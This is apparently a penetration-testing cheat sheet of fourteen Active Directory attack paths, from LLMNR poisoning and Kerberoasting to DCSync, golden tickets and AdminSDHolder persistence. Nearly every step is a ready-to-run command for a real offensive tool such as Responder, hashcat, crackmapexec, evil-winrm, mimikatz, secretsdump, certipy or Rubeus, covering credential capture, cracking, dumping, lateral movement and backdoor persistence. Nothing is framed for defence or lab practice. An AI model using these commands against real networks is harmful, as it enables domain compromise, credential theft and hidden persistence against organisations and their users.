Attack Path 1 — LLMNR → NTLM Capture → Pass-the-Hash
Scenario

A user authenticates on the network. The attacker captures the NTLM hash using LLMNR poisoning.

Steps
Start Responder
responder -I eth0 -wrf
Capture NTLM hash

Example output

SMB Hash captured
user::DOMAIN:HASH
Crack the hash
hashcat -m 5600 hash.txt rockyou.txt
Validate credentials
crackmapexec smb 10.10.10.0/24 -u user -p password
Lateral movement
evil-winrm -i target -u user -p password


Attack Path 2 — Password Spraying → Domain Access
Scenario

Weak password policies allow attackers to discover valid credentials.

Enumerate users
kerbrute userenum -d domain.local users.txt
Password spray
crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Welcome123'
Access system
evil-winrm -i target -u user -p password


Attack Path 3 — Kerberoasting → Service Account → Privilege Escalation
Scenario

Service accounts often have weak passwords.

Find SPNs
Get-DomainUser -SPN
Request service tickets
Invoke-Kerberoast
Crack the ticket
hashcat -m 13100 hashes.txt rockyou.txt
Login with cracked password
evil-winrm -i target -u serviceaccount -p password


Attack Path 4 — AS-REP Roasting
Scenario

Accounts with pre-authentication disabled allow offline password cracking.

Extract AS-REP hash
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10
Crack password
hashcat -m 18200 hash.txt rockyou.txt
Login
evil-winrm -i target -u user -p password


Attack Path 5 — BloodHound → Privilege Escalation Path
Scenario

A normal user has indirect privileges through AD relationships.

Collect AD data
SharpHound.exe -c All
Load into BloodHound
neo4j console
bloodhound
Find path

Example:

User → HelpDeskGroup → LocalAdmin → Server → Domain Admin
Exploit

Add user to group:

net group "HelpDesk" user /add /domain


Attack Path 6 — Credential Dumping → Domain Admin
Scenario

Administrator credentials stored in memory.

Dump credentials
mimikatz
sekurlsa::logonpasswords
Extract admin password

Example

Administrator
Password: Password123
Login to DC
evil-winrm -i dc.domain.local -u Administrator -p Password123


Attack Path 7 — Pass-the-Hash → Domain Compromise
Scenario

Administrator hash is captured.

Authenticate using hash
psexec.py domain/admin@target -hashes :NTLMHASH
Dump domain credentials
secretsdump.py domain/admin@dc-ip


Attack Path 8 — Resource-Based Constrained Delegation (RBCD)
Scenario

User can create machine accounts.

Create machine
New-MachineAccount
Configure delegation
Set-ADComputer
Exploit
rbcd.py domain/user:password
Obtain DA ticket
Impersonate Administrator


Attack Path 9 — ADCS Misconfiguration (ESC1)
Scenario

Certificate template allows privilege escalation.

Enumerate templates
certipy find
Request certificate
certipy req -u user@domain.local -p password -template vulnerable_template
Authenticate
certipy auth -pfx certificate.pfx


Attack Path 10 — DCSync Attack
Scenario

User has replication rights.

Dump KRBTGT
lsadump::dcsync /domain:domain.local /user:krbtgt
Extract domain hashes
Administrator
KRBTGT
All domain users


Attack Path 11 — Golden Ticket
Scenario

KRBTGT hash compromised.

Create forged Kerberos ticket
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21 /krbtgt:HASH /ptt
Access domain resources
Unlimited domain access


Attack Path 12 — Unconstrained Delegation
Scenario

Machine configured for unconstrained delegation.

Find vulnerable hosts
Get-DomainComputer -Unconstrained
Extract tickets
Rubeus.exe monitor
Impersonate domain admin
Pass the ticket


Attack Path 13 — Shadow Credentials
Scenario

Attacker adds authentication keys to user object.

Add shadow credential
certipy shadow add
Authenticate
certipy auth


Attack Path 14 — AdminSDHolder Persistence
Scenario

Backdoor privileged groups.

Modify ACL
Set-ADObject
Persist access
Every privileged account inherits the backdoor
